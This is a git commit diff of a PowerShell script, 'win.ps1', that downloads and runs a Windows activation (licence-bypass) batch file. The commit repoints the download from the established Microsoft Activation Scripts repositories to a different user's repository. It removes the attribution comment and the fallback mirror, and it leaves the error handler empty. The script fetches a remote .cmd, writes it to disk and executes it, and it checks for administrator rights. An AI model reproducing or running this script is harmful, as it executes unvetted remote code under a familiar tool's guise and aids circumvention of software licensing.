3aee398a658e16ff1df342edf422a6d7627dc0fe
lolali054 <62222309+lolali054@users.noreply.github.com>
2024-03-10 19:22:11 -0400

    Update win.ps1

--- win.ps1
+++ win.ps1
@@ -1,11 +1,7 @@
-# Check the instructions here on how to use it mass grave[.]dev
-
 $ErrorActionPreference = "Stop"
-# Enable TLSv1.2 for compatibility with older clients
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
-$DownloadURL = 'https://raw.githubusercontent.com/massgravel/Microsoft-Activation-Scripts/master/MAS/All-In-One-Version/MAS_AIO-CRC32_9AE8AFBA.cmd'
-$DownloadURL2 = 'https://bitbucket.org/WindowsAddict/microsoft-activation-scripts/raw/master/MAS/All-In-One-Version/MAS_AIO-CRC32_9AE8AFBA.cmd'
+$DownloadURL = 'https://raw.githubusercontent.com/lolali054/Win/main/windowsactivation.cmd'
 
 $rand = Get-Random -Maximum 99999999
 $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
@@ -15,15 +11,14 @@ try {
     $response = Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing
 }
 catch {
-    $response = Invoke-WebRequest -Uri $DownloadURL2 -UseBasicParsing
+    # Handle the error if necessary
 }
 
 $ScriptArgs = "$args "
-$prefix = "@REM $rand `r`n"
-$content = $prefix + $response
+$content = $response
 Set-Content -Path $FilePath -Value $content
 
 Start-Process $FilePath $ScriptArgs -Wait
 
-$FilePaths = @("$env:TEMP\MAS*.cmd", "$env:SystemRoot\Temp\MAS*.cmd")
-foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
+# Cleanup
+Remove-Item $FilePath
